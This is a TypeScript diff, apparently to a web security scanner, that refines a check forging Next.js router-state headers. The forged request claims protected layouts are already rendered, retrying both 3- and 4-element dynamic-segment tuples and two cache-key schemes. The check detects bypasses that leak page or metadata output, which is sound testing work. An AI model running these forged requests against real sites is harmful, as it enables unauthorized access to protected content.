@@ -17,9 +17,28 @@ export type LeafMode = "page" | "metadata-only";
  */
 export type AncestorSegment = string | { paramName: string; value: string };
 
+/**
+ * Next.js's `flightRouterStateSchema` validates a dynamic segment as a `superstruct.tuple()`,
+ * which requires an EXACT element count — too few OR too many elements both fail
+ * `assert()` before `matchSegment` is ever reached, rejecting the entire request. That
+ * exact count changed across Next.js releases: every version up to at least 16.2.6 requires
+ * a 3-element tuple (`[paramName, value, dynamicParamType]`); 16.3.0 added a mandatory 4th
+ * `staticSiblings` element (`[paramName, cacheKey, dynamicParamType, staticSiblings]`,
+ * `null` meaning "siblings unknown"). A black-box crawl can't know which schema shape the
+ * target's Next.js build expects, so both are tried (see `DYNAMIC_TUPLE_LENGTHS`).
+ */
+type DynamicTupleLength = 3 | 4;
+
 /** Converts one ancestor segment to its FlightRouterState wire representation. */
-const toSegmentRepr = (segment: AncestorSegment): string | [string, string, "d"] =>
-    typeof segment === "string" ? segment : [segment.paramName, segment.value, "d"];
+const toSegmentRepr = (
+    segment: AncestorSegment,
+    tupleLength: DynamicTupleLength
+): string | [string, string, "d"] | [string, string, "d", null] =>
+    typeof segment === "string"
+        ? segment
+        : tupleLength === 4
+          ? [segment.paramName, segment.value, "d", null]
+          : [segment.paramName, segment.value, "d"];
 
 /** The literal URL path value of an ancestor segment, regardless of representation. */
 export const ancestorSegmentValue = (segment: AncestorSegment): string =>
@@ -30,12 +49,17 @@ export const ancestorSegmentValue = (segment: AncestorSegment): string =>
  * claiming every segment in `ancestorSegments` is already client-rendered, with the
  * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
  * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
- * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
+ * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`. `tupleLength`
+ * only affects segments that are dynamic-ancestor claims (see `toSegmentRepr`).
  */
-export const buildStateTreeHeader = (ancestorSegments: AncestorSegment[], leafMode: LeafMode = "page"): string => {
+export const buildStateTreeHeader = (
+    ancestorSegments: AncestorSegment[],
+    leafMode: LeafMode = "page",
+    tupleLength: DynamicTupleLength = 4
+): string => {
     let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
     for (let i = ancestorSegments.length - 1; i >= 0; i--) {
-        node = [toSegmentRepr(ancestorSegments[i]), { children: node }];
+        node = [toSegmentRepr(ancestorSegments[i], tupleLength), { children: node }];
     }
     const tree = ["", { children: node }];
     return encodeURIComponent(JSON.stringify(tree));
@@ -247,15 +271,19 @@ interface ForgeAttemptResult {
 /** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
 const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");
 
+/** True when at least one ancestor segment is a dynamic-route claim (see `AncestorSegment`). */
+const hasDynamicSegment = (ancestors: AncestorSegment[]): boolean => ancestors.some((s) => typeof s !== "string");
+
 /** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
 const attemptForge = async (
     candidateUrl: string,
     ancestors: AncestorSegment[],
     leafMode: LeafMode,
     keyMode: RscKeyMode,
-    timeout: number
+    timeout: number,
+    tupleLength: DynamicTupleLength
 ): Promise<ForgeAttemptResult> => {
-    const stateTree = buildStateTreeHeader(ancestors, leafMode);
+    const stateTree = buildStateTreeHeader(ancestors, leafMode, tupleLength);
     const nextUrl = "/" + ancestorsToPath(ancestors);
     const rscKey =
         keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);
@@ -287,13 +315,41 @@ const attemptForgeWithKeyFallback = async (
     candidateUrl: string,
     ancestors: AncestorSegment[],
     leafMode: LeafMode,
-    timeout: number
+    timeout: number,
+    tupleLength: DynamicTupleLength
 ): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
-    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout);
+    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout, tupleLength);
     if (legacy.success) return { ...legacy, keyMode: "legacy" };
 
-    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout);
+    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout, tupleLength);
     return { ...strong, keyMode: "strong" };
+};
+
+/** Both dynamic-segment tuple lengths real Next.js servers can require — see `DynamicTupleLength`. */
+const DYNAMIC_TUPLE_LENGTHS: readonly DynamicTupleLength[] = [4, 3];
+
+/**
+ * Wraps `attemptForgeWithKeyFallback` with a schema-shape fallback: an ancestor list with no
+ * dynamic segment is tried once (tuple length is irrelevant — no dynamic segment ever reaches
+ * `toSegmentRepr`'s tuple branch), but a list containing a dynamic-ancestor claim is retried
+ * under each of `DYNAMIC_TUPLE_LENGTHS` until one is accepted, since a black-box crawl can't
+ * know which schema shape the target's Next.js build expects (see `DynamicTupleLength`).
+ */
+const attemptForgeWithSchemaFallback = async (
+    candidateUrl: string,
+    ancestors: AncestorSegment[],
+    leafMode: LeafMode,
+    timeout: number
+): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
+    if (!hasDynamicSegment(ancestors)) {
+        return attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, 4);
+    }
+    let last: ForgeAttemptResult & { keyMode: RscKeyMode } = { success: false, body: "", keyMode: "legacy" };
+    for (const tupleLength of DYNAMIC_TUPLE_LENGTHS) {
+        last = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, tupleLength);
+        if (last.success) return last;
+    }
+    return last;
 };
 
 const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
@@ -309,6 +365,11 @@ const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
  * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
  * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
  * cleanly apply (e.g. a tenant-scoped layout).
+ *
+ * Every dynamic-ancestor guess is tried against both `DYNAMIC_TUPLE_LENGTHS` schema shapes
+ * (see `DynamicTupleLength`), since a black-box crawl can't know which Next.js release the
+ * target runs and the two shapes are mutually exclusive (Next.js's schema validation rejects
+ * both a too-short AND a too-long tuple).
  *
  * If every `COMMON_DYNAMIC_PARAM_NAMES` guess fails for both leaf modes, a bounded fallback
  * kicks in (internal#158): every response body already returned by those failed attempts
@@ -367,7 +428,7 @@ const next_routerStateForge = async (
          * first success. */
         const tryAttempts = async (attempts: AncestorSegment[][], leafMode: LeafMode): Promise<boolean> => {
             for (const ancestors of attempts) {
-                const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout);
+                const result = await attemptForgeWithSchemaFallback(candidateUrl, ancestors, leafMode, timeout);
                 if (lastAncestorValue && result.body) {
                     for (const name of extractParamNameCandidatesFromFlightBody(result.body, lastAncestorValue)) {
                         harvestedNames.add(name);
